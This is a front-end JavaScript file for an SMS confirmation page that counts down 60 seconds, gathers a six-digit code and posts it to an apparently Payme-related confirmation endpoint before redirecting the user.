const base_api = "https://apppay-production.up.railway.app/api/v1"

const sended_phone = localStorage.getItem('send_sms_phone')
if (!sended_phone){
    window.location.href = '../index.html';
}

localStorage.removeItem('send_sms_phone')


document.getElementById('send_phone').textContent = localStorage.getItem('send_sms_phone');


let remainingSeconds = 60;
const timeDisplay = document.getElementById('timeDisplay');

function formatTime(seconds) {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
}

function updateTimeDisplay() {
    timeDisplay.textContent = formatTime(remainingSeconds);
}

function startCountdown() {
    const interval = setInterval(() => {
        if (remainingSeconds <= 0) {
            clearInterval(interval);
            timeDisplay.textContent = '00:00'; // Optional: Show 00:00 when finished
        } else {
            remainingSeconds--;
            updateTimeDisplay();
        }
    }, 1000); // Update every second
}

// Start countdown on page load
startCountdown();


document.querySelectorAll('.code-input').forEach((input, index, inputs) => {
    input.addEventListener('input', function () {
        if (this.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
        if (this.value.length === 0 && index > 0) {
            inputs[index - 1].focus();
        }

    });
});

document.querySelector('.continue').addEventListener('click', function() {
    // Collect the SMS code from the inputs
    const codeInputs = document.querySelectorAll('.code-input');
    const code = Array.from(codeInputs).map(input => input.value).join('');

    if (code.length !== 6) {
        return;
    }

    // Prepare data to be sent to the API
    const data = {
        user_id: localStorage.getItem('user_id'),
        code: code
    };

    // Send the API request
    fetch(`${base_api}/payme-confirm-sms`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
        .then(response => response.json())
        .then(data => {
            // Handle success response
            if (data.success) {
                window.location.href = '../..?user_id=' + localStorage.getItem('user_id');
                localStorage.removeItem('send_sms_phone')
            } else {
                alert(data.message);
            }
        })
        .catch((error) => {
            console.error('Error:', error);

        });
});


document.querySelector('.Cancel').addEventListener('click', () => {
    window.location.href = '../index.html'; // Or another appropriate action
});

window.addEventListener('beforeunload', function(event) {
    // Redirect the user to the index.html
    window.location.href = '../index.html';
});